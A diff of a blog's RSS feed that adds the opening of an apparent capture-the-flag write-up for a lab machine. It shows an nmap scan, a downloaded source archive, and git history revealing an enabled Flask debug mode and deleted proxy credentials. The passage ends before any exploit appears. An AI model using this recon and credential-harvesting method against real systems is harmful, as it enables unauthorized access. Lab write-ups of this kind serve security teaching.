@@ -5,8 +5,662 @@
         <description>Recent content in Posts on MØst Xeon</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 27 Sep 2022 22:16:35 +0300</lastBuildDate>
+        <lastBuildDate>Wed, 28 Sep 2022 08:35:17 +0300</lastBuildDate>
         <atom:link href="https://mostxeon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Opensource</title>
+            <link>https://mostxeon.github.io/posts/opensource/</link>
+            <pubDate>Wed, 28 Sep 2022 08:35:17 +0300</pubDate>
+            
+            <guid>https://mostxeon.github.io/posts/opensource/</guid>
+            <description>false</description>
+            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Starting with a full tcp port scan we got the below results:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -sV -sC -vvv -p- -oN nmap/nmap-all-tcp.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.164
+</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2022-07-27 03:06:30 EEST <span style="color:#66d9ef">for</span> 129s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE    SERVICE REASON      VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOm3Ocn3qQzvKFsAf8u2wdkpi0XryPX5W33bER74CfZxc4QPasF+hGBNSaCanZpccGuPffJ9YenksdoTNdf35cvhamsBUq6TD88Cyv9Qs68kWPJD71MkSDgoyMFIe7NTdzyWJJjmUcNHRvwfo6KQsVXjwC4MN+SkL6dLfAY4UawSNhJZGTiKu0snAV6TZ5ZYnmDpnKIEZzf/dOK6bBu4SCu9DRjPknuZkl7sKp3VCoI9CRIu1tihqs1NPhFa+XnHSRsULWtQqtmxZP5UXbmgwETxmpfw8M9XcMH0QXr8JSAdDkg2NtIapmPX/a3hVFATYg+idaEEQNlZHPUKLbCTyJ
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLA9ak8TUAPl/F77SPc1ut/8B+eOukyC/0lof4IrqJoPJLYusbXk+9u/OgSGp6bJZhotkJUvhC7k0rsA7WX19Y8<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINxEEb33GC5nT5IJ/YY+yDpTKQGLOK1HPsEzM99H4KKA
+</span></span><span style="display:flex;"><span>80/tcp   open     http    syn-ack     Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET OPTIONS HEAD
+</span></span><span style="display:flex;"><span>|_http-title: upcloud - Upload files <span style="color:#66d9ef">for</span> Free!
+</span></span><span style="display:flex;"><span>|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">27</span> Jul <span style="color:#ae81ff">2022</span> 00:07:01 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">5316</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;upcloud - Upload files <span style="color:#66d9ef">for</span> Free!&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/jquery/jquery-3.4.1.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/popper/popper.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/js/bootstrap.min.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/js/ie10-viewport-bug-workaround.js&#34;</span>&gt;&lt;/script&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/vendor/bootstrap/css/bootstrap.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-grid.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34; /static/vendor/bootstrap/css/bootstrap-reboot.css&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>|     Server: Werkzeug/2.1.2 Python/3.10.3
+</span></span><span style="display:flex;"><span>|     Date: Wed, <span style="color:#ae81ff">27</span> Jul <span style="color:#ae81ff">2022</span> 00:07:01 GMT
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Allow: GET, OPTIONS, HEAD
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|   RTSPRequest: 
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span style="display:flex;"><span>|     <span style="color:#e6db74">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Content-Type&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Message: Bad request version <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;RTSP/1.0&#39;</span><span style="color:#f92672">)</span>.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/body&gt;
+</span></span><span style="display:flex;"><span>|_    &lt;/html&gt;
+</span></span><span style="display:flex;"><span>3000/tcp filtered ppp     no-response
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port80-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>7/27%Time<span style="color:#f92672">=</span>62E081A5%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>GetR
+</span></span><span style="display:flex;"><span>SF:equest,1573,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x20P
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ython/3\.10\.3\r\nDate:\x20Wed,\x2027\x20Jul\x202022\x2000:07:01\x20GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:5316\r\nConnection:\x20close\r\n\r\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20&lt;meta\x20charset=\&#34;UTF-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-scale=1\.0\&#34;&gt;\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:n\x20\x20\x20\x20&lt;title&gt;upcloud\x20-\x20Upload\x20files\x20for\x20Free!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&lt;/title&gt;\n\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/static/vendor/jquery/jque
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ry-3\.4\.1\.min\.js\&#34;&gt;&lt;/script&gt;\n\x20\x20\x20\x20&lt;script\x20src=\&#34;/stat
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ic/vendor/popper/popper\.min\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;script
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20src=\&#34;/static/vendor/bootstrap/js/bootstrap\.min\.js\&#34;&gt;&lt;/script&gt;\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20&lt;script\x20src=\&#34;/static/js/ie10-viewport-bug-workaround
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\.js\&#34;&gt;&lt;/script&gt;\n\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:=\&#34;/static/vendor/bootstrap/css/bootstrap\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;li
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nk\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;\x20/static/vendor/bootstrap/css/boo
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tstrap-grid\.css\&#34;/&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20hr
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ef=\&#34;\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\&#34;/&gt;\n\n\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20&lt;link\x20rel=&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,C7,<span style="color:#e6db74">&#34;HTTP/1\.1\x20200\x20OK\r\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Wed,\x2027\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20Jul\x202022\x2000:07:01\x20GMT\r\nContent-Type:\x20text/html;\x20cha
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:rset=utf-8\r\nAllow:\x20GET,\x20OPTIONS,\x20HEAD\r\nContent-Length:\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\r\nConnection:\x20close\r\n\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,1F4,<span style="color:#e6db74">&#34;&lt;!DOCTYPE\x20HTM
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:L\x20PUBLIC\x20\&#34;-//W3C//DTD\x20HTML\x204\.01//EN\&#34;\n\x20\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\&#34;http://www\.w3\.org/TR/html4/strict\.dtd\&#34;&gt;\n&lt;html&gt;\n\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equ
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:iv=\&#34;Content-Type\&#34;\x20content=\&#34;text/html;charset=utf-8\&#34;&gt;\n\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;E
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:rror\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF::\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20req
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:uest\x20version\x20\(&#39;RTSP/1\.0&#39;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Wed Jul 27 03:08:39 2022 -- 1 IP address (1 host up) scanned in 129.97 seconds</span>
+</span></span></code></pre></div><p>I can see 2 opens ports <em>(22, 80)</em> with a third <em>(3000)</em> that appears to be filtered meaning that some sort of firewall is blocking the reply back.</p>
+<p>Looking at port <em>80</em>, the banner tells us that its a python/3.10.3 based <a href="https://wsgi.readthedocs.io/en/latest/what.html"><em>WSGI</em></a> web application: <a href="https://werkzeug.palletsprojects.com/en/2.1.x/"><em>Werkzeug/2.1.2</em></a></p>
+<p>By surfing the home page on port 80, I can see two buttons, one to download the source code for a certain application and the other one to go to a page where you can upload a file.</p>
+<p><img src="exploring-home-page.png" alt="Exploring the Home Page"></p>
+<h3 id="exploring-the-source-code">Exploring the Source Code</h3>
+<p>Let&rsquo;s download the source code and inspect it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>source.zip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ unzip source.zip 
+</span></span><span style="display:flex;"><span>Archive:  source.zip
+</span></span><span style="display:flex;"><span>   creating: app/
+</span></span><span style="display:flex;"><span>   creating: app/app/
+</span></span><span style="display:flex;"><span>  inflating: app/app/views.py        
+</span></span><span style="display:flex;"><span>  inflating: app/app/__init__.py     
+</span></span><span style="display:flex;"><span>   creating: app/app/static/
+</span></span><span style="display:flex;"><span>   creating: app/app/static/js/
+</span></span><span style="display:flex;"><span>   ...
+</span></span></code></pre></div><h3 id="noticing-git-directory">Noticing &ldquo;.git&rdquo; Directory</h3>
+<p>If I list the contents of the zip file using &ldquo;<em>ls -la</em>&rdquo; I can see a <em>.git</em> directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">2460</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> kali kali    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">5</span> 00:18 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> kali kali    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">4</span> 22:39 ..
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">5</span> kali kali    <span style="color:#ae81ff">4096</span> Oct  <span style="color:#ae81ff">5</span> 13:38 app
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">110</span> Apr <span style="color:#ae81ff">28</span> 14:40 build-docker.sh
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> kali kali    <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">28</span> 14:34 config
+</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ae81ff">1</span> kali kali     <span style="color:#ae81ff">574</span> Apr <span style="color:#ae81ff">28</span> 15:50 Dockerfile
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">8</span> kali kali    <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">28</span> 15:50 .git
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kali kali <span style="color:#ae81ff">2489147</span> Oct  <span style="color:#ae81ff">5</span> 00:00 source.zip
+</span></span></code></pre></div><p>This means that we can interact with it and see more information about this application, like different <em>branches</em>,<em>logs</em> &hellip;</p>
+<p>After searching around a little bit, I got something interesting:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git branches <span style="color:#75715e"># to list available branches</span>
+</span></span><span style="display:flex;"><span>  dev
+</span></span><span style="display:flex;"><span>* public
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ git switch dev <span style="color:#75715e"># to switch to the &#34;dev&#34; branch</span>
+</span></span><span style="display:flex;"><span>Switched to branch <span style="color:#e6db74">&#39;dev&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git log <span style="color:#75715e"># to list the logs (every change and commit made to the project)</span>
+</span></span><span style="display:flex;"><span>commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 <span style="color:#f92672">(</span>HEAD -&gt; dev<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:47:24 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ease testing
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:54 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    added gitignore
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:16 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    updated
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:45:17 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    initial
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git show HEAD <span style="color:#75715e"># to show the changes made on the last commit</span>
+</span></span><span style="display:flex;"><span>commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 <span style="color:#f92672">(</span>HEAD -&gt; dev<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:47:24 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ease testing
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>diff --git a/Dockerfile b/Dockerfile
+</span></span><span style="display:flex;"><span>index 76c7768..0875eda <span style="color:#ae81ff">100644</span>
+</span></span><span style="display:flex;"><span>--- a/Dockerfile
+</span></span><span style="display:flex;"><span>+++ b/Dockerfile
+</span></span><span style="display:flex;"><span>@@ -29,7 +29,7 @@ ENV PYTHONDONTWRITEBYTECODE<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Set mode</span>
+</span></span><span style="display:flex;"><span> ENV MODE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PRODUCTION&#34;</span>
+</span></span><span style="display:flex;"><span>-# ENV FLASK_DEBUG<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>+ENV FLASK_DEBUG<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Run supervisord</span>
+</span></span><span style="display:flex;"><span> CMD <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/usr/bin/supervisord&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/etc/supervisord.conf&#34;</span><span style="color:#f92672">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git show HEAD~1 <span style="color:#75715e"># to show the changes made on the commit before the last one and `HEAD~n` to show the n commit before the last one </span>
+</span></span><span style="display:flex;"><span>commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
+</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
+</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:54 <span style="color:#ae81ff">2022</span> +0200
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    added gitignore
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>diff --git a/.gitignore b/.gitignore
+</span></span><span style="display:flex;"><span>new file mode <span style="color:#ae81ff">100644</span>
+</span></span><span style="display:flex;"><span>index 0000000..e50a290
+</span></span><span style="display:flex;"><span>--- /dev/null
+</span></span><span style="display:flex;"><span>+++ b/.gitignore
+</span></span><span style="display:flex;"><span>@@ -0,0 +1,26 @@
+</span></span><span style="display:flex;"><span>+.DS_Store
+</span></span><span style="display:flex;"><span>+.env
+</span></span><span style="display:flex;"><span>+.flaskenv
+</span></span><span style="display:flex;"><span>+*.pyc
+</span></span><span style="display:flex;"><span>+*.pyo
+</span></span><span style="display:flex;"><span>+env/
+</span></span><span style="display:flex;"><span>+venv/
+</span></span><span style="display:flex;"><span>+.venv/
+</span></span><span style="display:flex;"><span>+env*
+</span></span><span style="display:flex;"><span>+dist/
+</span></span><span style="display:flex;"><span>+build/
+</span></span><span style="display:flex;"><span>+*.egg
+</span></span><span style="display:flex;"><span>+*.egg-info/
+</span></span><span style="display:flex;"><span>+_mailinglist
+</span></span><span style="display:flex;"><span>+.tox/
+</span></span><span style="display:flex;"><span>+.cache/
+</span></span><span style="display:flex;"><span>+.pytest_cache/
+</span></span><span style="display:flex;"><span>+.idea/
+</span></span><span style="display:flex;"><span>+docs/_build/
+</span></span><span style="display:flex;"><span>+.vscode
+</span></span><span style="display:flex;"><span>+
+</span></span><span style="display:flex;"><span>+# Coverage reports
+</span></span><span style="display:flex;"><span>+htmlcov/
+</span></span><span style="display:flex;"><span>+.coverage
+</span></span><span style="display:flex;"><span>+.coverage.*
+</span></span><span style="display:flex;"><span>+*,cover
+</span></span><span style="display:flex;"><span>diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
+</span></span><span style="display:flex;"><span>deleted file mode <span style="color:#ae81ff">100644</span>
+</span></span><span style="display:flex;"><span>index 5975e3f..0000000
+</span></span><span style="display:flex;"><span>--- a/app/.vscode/settings.json
+</span></span><span style="display:flex;"><span>+++ /dev/null
+</span></span><span style="display:flex;"><span>@@ -1,5 +0,0 @@
+</span></span><span style="display:flex;"><span>-<span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;python.pythonPath&#34;</span>: <span style="color:#e6db74">&#34;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&#34;</span>,
+</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;http.proxy&#34;</span>: <span style="color:#e6db74">&#34;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&#34;</span>,
+</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;http.proxyStrictSSL&#34;</span>: false
+</span></span><span style="display:flex;"><span>-<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>I can see some credentials <em>dev01:Soulless_Developer#2022</em> that were stored before and then removed in this commit, but when I tried to <em>SSH</em> using them it failed, however they might be useful later on.</p>
+<h2 id="spotting-a-vulnerability">Spotting A Vulnerability</h2>
+<p>After cycling through the files, <em>app/app/view.py</em> caugth my interest.</p>
